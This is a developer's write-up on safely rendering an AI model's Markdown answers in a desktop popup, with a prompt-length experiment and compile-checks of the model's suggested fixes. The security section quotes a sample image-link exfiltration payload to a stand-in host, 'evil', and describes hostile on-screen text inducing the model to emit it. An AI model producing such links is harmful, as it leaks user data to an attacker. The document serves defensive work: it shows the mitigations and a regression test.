# C1b — Make the answer readable

The popup worked but showed raw text. The model writes Markdown, so every answer arrived as a
wall of asterisks and hashes. C1 specified behaviour only; nothing owned what the popup looked
like.

## What the real answers contain

Measured across every saved answer in `evals/out/` — 993 lines, 38 KB of genuine model output.
Built against these, not against invented Markdown.

| | | | |
|---|---|---|---|
| `###` headings | 77 | fenced code blocks | 89 |
| `####` headings | 30 | — tagged `rust` | 41 |
| `**bold**` | 254 | — tagged `text` | 2 |
| inline `` `code` `` | 299 | — **untagged** | **46** |
| bullet items | 178 | `---` rules | 77 |
| blockquotes | 18 | numbered lists | 0 |

**Half the fences carry no language tag**, and many are rustc *output* rather than Rust source.
So: highlight Rust, leave everything else plain, and never guess at an untagged block.

## What shipped

`react-markdown` + `remark-gfm`, not `streamdown`. Streamdown is purpose-built for this, but it
ships Tailwind styling and this popup has hand-written CSS that has to stay in charge of a
translucent surface. Its block memoisation solves a problem 8 KB answers don't have.

`remend` standalone for the one part that did matter: closing unterminated `**bold`, `` `code ``
and fences mid-stream, so text doesn't flicker between interpretations as tokens land.

Shiki, lazy, JS regex engine, Rust + plaintext only. The default Shiki import pulls megabytes of
grammars; `highlight.js` registers ~190 languages at 307 KB gzip. Confirmed in the build output —
`core`, `engine-javascript`, `rust` and the theme are four separate chunks, none in the main
bundle.

Window grows to fit between 220 and 760 px, re-anchoring bottom-right after each resize.

## The security finding

The model transcribes whatever is on screen, so its output is untrusted input rendered into our
own webview. Two distinct risks:

**HTML injection** — closed almost for free. `react-markdown` does not render raw HTML unless you
add `rehype-raw`. The fix is to never install that plugin, and `skipHtml` drops the tags rather
than showing them.

**Exfiltration by image** — the one I had not considered. Even with HTML disabled, plain Markdown
`![x](https://evil/?leak=...)` still renders an `<img>`, and rendering it makes a request that
carries data out. No XSS required. Hostile text on screen could induce exactly that.

The mitigation costs nothing: this popup explains code, so it never needs a remote image or a
clickable link. `img` renders nothing, `a` renders as plain text. Refusing the capability beats
filtering destinations.

Also closed a pre-existing gap: `tauri.conf.json` had `"csp": null`, which Tauri documents as
applying no CSP at all — no backstop if sanitisation ever failed.

## Verification

`npm run check:inert` renders eleven hostile inputs through the real component and asserts on the
HTML. It is a regression test, not a demo — both properties it guards are one careless line away
from breaking.

```
PASS  no <img> / <script> / <iframe> / <a> element
PASS  no href, src, or on* attribute
PASS  no URL in any attribute
PASS  link text survives as words
PASS  entity-smuggled tag stays escaped
PASS  autolink URL is visible but inert

elements emitted: div, ol, li, span
```

**The failure path is proven, not assumed.** Reverting the `img`/`a` overrides makes six checks
fail and the script exit 1.

Two findings from writing it:

- **Asserting on raw HTML was necessary.** A first pass forbade the substring `src=` anywhere in
  the output and reported a false failure: case 7 feeds `&lt;img src=x&gt;`, which renders as
  escaped prose containing those characters while being completely inert. Only attributes inside
  real tags count. A screenshot cannot make that distinction — which is the whole argument for
  testing this way.
- **A URL rendered as visible text is fine.** GFM linkifies bare URLs, so `https://example.com/x`
  becomes a `<span>` with no `href`. It makes no request and cannot be clicked, and showing the
  reader what URL the model transcribed is desirable.

### The injection test was silently not running

Worth recording because it is the more instructive bug. The dev preview concatenated the saved
answer and the injection cases into one string. That answer was truncated at the token cap
**mid-code-fence**, so `remend` correctly closed the dangling fence at the very end — swallowing
the entire injection block into it. The cases rendered as syntax-highlighted code and the test
passed by never running.

Two fixes, because either alone would have left the trap set:

- the fixture generator now balances fences before writing, and
- the preview renders the answer and the probe as **two separate `<Answer>` instances**, so no
  amount of malformed Markdown in one can absorb the other.

## The prompt experiment — rejected on the evidence

**Result: the brief prompt does not ship. The current prompt stands.**

A2 warned against editing the prompt, but its failing variant — *"What's wrong on this screen? Be
specific about the file, the line number, and the fix"* — changed **two** things at once: it was
both terser *and* fault-presupposing. A2 hypothesised that the presupposition manufactured the
faults, and never isolated the two. So brevity alone was untested, not known bad.

This variant changes one thing. The current prompt is kept **verbatim as a prefix**, preserving the
exact *"otherwise explain what matters here"* phrasing A2 credited with suppressing confabulation,
and appends only:

> Lead with the answer in one sentence, then the detail. Give one explanation and one fix, not a
> list of alternatives. Stop once you've answered; don't restate the same point in different words.

### The control has to reproduce before the comparison means anything

The first run was invalid, and the failure is worth recording. The control was built with
`cp capture/prompt.txt`, which carries a **trailing newline**; A2's baseline came from a string
constant in `bench.mjs` with none. Everything else matched — same Ollama 0.33.3, same model, same
image, `temperature: 0`, `seed: 42`.

**That one byte changed the answer, and changed the verdict.** A2 recorded 8B-Q4 passing case-02 by
concluding the code *will not compile*. With the trailing newline, the same model on the same image
said it **"will compile successfully"** and would segfault at runtime — the exact PARTIAL-grade
failure A2 recorded for 8B-Q8, which case-01 disproves on the adjacent screen.

Rewritten byte-exactly, the control reproduces A2's answer hash `9f84dcc7d8c5` at 3,732 chars. Only
then is the comparison worth reading. **Any future prompt work must pin the control to a known
answer hash before drawing a conclusion.** The CLI is unaffected: `capture/src/main.rs` calls
`.trim()`.

### Measured

| | control | brief |
|---|---|---|
| case-01 chars | 3,715 | **699** |
| case-02 chars | 3,732 | **754** |
| case-01 verdict | pass | **pass** — mechanism right; omits `E0502`, which cases.md wants only "ideally" |
| case-02 verdict | pass | **FAIL** |

Case-02 is the whole decision. The brief answer locates the real conflict and then says:

> This causes undefined behavior, **even though the code compiles**.

cases.md fails an answer that "describes the file as fine," and case-01 on the adjacent screen
disproves it outright. That is a regression, and PLAN.md §2 says a prompt change ships only if it
doesn't regress the set. **Rejected.**

### The refinement to A2's hypothesis

A2's confounded variant produced *invented* errors. This one invented nothing — it read the code
correctly and identified the real borrow conflict — but drew the wrong conclusion about whether it
compiles. The two changes fail in **different ways**, so A2's hypothesis was incomplete rather than
wrong:

- **presupposing a fault** → fabricates faults that aren't there
- **demanding brevity** → correct mechanism, wrong conclusion

Hypothesis, stated as one: the model reasons its way to the verdict *by writing*. The control's
"will not compile" arrives only after ~3,000 characters of working through the mechanism.
Compressing the answer removes the deliberation that produces the conclusion.

If that holds, **length here is not padding — it is the reasoning**, and length has to be solved in
the UI rather than the prompt. Which is what the rest of C1b does, and what the plan named as the
fallback.

## Grading the fix, not just the diagnosis — `npm run check:fixes`

Reading the answers turned up something cases.md never graded: whether the proposed **fix** works.
`evals/fixcheck.mjs` borrow-checks each one with `rustc --emit=metadata`, which needs no linker.

```
ok   baseline (the bug itself)               REJECTED E0502
ok   A2 PASS answer, "Option 1"              REJECTED E0502
ok   Vec::reserve before borrowing           REJECTED E0502
ok   clone the buffer                        COMPILES
ok   read before the push (end the borrow)   COMPILES
```

**The answer A2 graded as a PASS proposes a fix that fails with the identical E0502 it had just
correctly explained.** Its "Option 1" binds `&frames[0]`, pushes, then reads — the same static
borrow conflict. The `Vec::reserve` and `Vec::with_capacity` fixes seen in other runs fail the same
way, because capacity is irrelevant to a *static* borrow conflict. That is an easy thing to nod
along to on a screen.

And the rejected brief prompt is the one whose fix actually compiles. **Each is right exactly where
the other is wrong** — which is why "which prompt is better" was the wrong question, and the
criterion had to be the stated one: does it regress the set.

A2's case-02 PASS stands, since the conclusion was what was graded, but it should be read with this
caveat. cases.md now carries a fix-must-compile criterion so the next model is held to it.

## Still open

Nothing in C1b. F2 should grow the eval set; the fix-must-compile criterion gives it a sharper
grading tool than it had.
